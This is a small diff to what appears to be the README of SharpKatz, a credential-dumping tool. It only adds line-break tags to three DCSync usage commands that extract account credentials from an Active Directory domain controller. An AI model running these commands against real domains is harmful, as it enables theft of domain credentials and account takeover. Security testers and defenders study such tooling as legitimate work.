@@ -33,6 +33,6 @@ Logonpasswords
 
 DCSync
 
-```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```
-```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```
-```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```
+```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
+```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
+```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
